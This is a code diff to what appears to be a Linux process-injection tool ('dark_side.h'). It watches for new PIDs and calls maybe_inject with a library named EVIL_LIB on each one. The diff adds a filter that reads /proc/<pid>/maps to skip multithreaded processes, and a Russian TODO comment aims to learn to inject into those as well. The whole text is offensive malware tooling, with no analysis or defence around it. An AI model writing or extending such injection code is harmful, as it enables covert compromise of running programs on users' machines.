@@ -22,8 +22,12 @@ SOFTWARE.*/
 
 #include <unistd.h>
 
+#include <algorithm>
 #include <iostream>
 #include <thread>
+#include <experimental/filesystem>
+#include <fstream>
+#include <iterator>
 
 #include "dark_side.h"
 
@@ -44,6 +48,24 @@ void make_noise() {
 	}
 }
 
+namespace fs = std::experimental::filesystem;
+using namespace std::string_literals;
+
+// TODO научиться останавливать многопоточные приложения и инжектиться в них
+bool is_filtered(const pid_t pid) {
+	auto maps = fs::path{"/proc"} / std::to_string(pid) / "maps"s;
+	std::ifstream f{maps};
+	if (!f) {
+		return true;
+	}
+	for (auto it = std::istream_iterator<std::string>(f); it != std::istream_iterator<std::string>(); ++it) {
+		if (it->find("/libpthread-") != it->npos) {
+			return true;
+		}
+	}
+	return false;
+}
+
 } // namespace
 
 int main(int argc, char *argv[]) {
@@ -52,6 +74,9 @@ int main(int argc, char *argv[]) {
 
 	for (;;) {
 		for (auto pid: watcher.new_pids()) {
+			if (is_filtered(pid)) {
+				continue;
+			}
 			std::cout << "found new pid '" << pid << "'" << std::endl
 				<< "trying to inject " << EVIL_LIB << std::endl;
 			maybe_inject(pid, EVIL_LIB);
